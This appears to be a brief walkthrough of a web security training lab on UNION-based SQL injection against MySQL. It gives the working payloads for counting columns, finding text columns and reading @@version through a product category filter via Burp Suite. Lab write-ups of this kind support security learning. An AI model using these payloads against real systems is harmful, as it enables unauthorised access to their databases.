# Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft.

- This lab contains a SQL injection vulnerability in the product category filter.
- You can use a UNION attack to retrieve the results from an injected query.

# To solve the lab, display the database version string.
```Make the database retrieve the string: '8.0.39-0ubuntu0.20.04.1'```

# Use Burp Suite to intercept and modify the request that sets the product category filter.

# Determine the number of columns that are being returned by the query and which columns contain text data.

# check columns
```
' UNION SELECT NULL,NULL#
```

# check which column contain text
```
'+UNION+SELECT+NULL,'abc'--
or
'UNION SELECT NULL,'def'--
'UNION SELECT 'abc',NULL--
'UNION SELECT 'abc','def'--
```
- BOth column contains text.

# Now display the database version
```
category=Pets' UNION SELECT @@version,'abc'#
```
- This will display database version.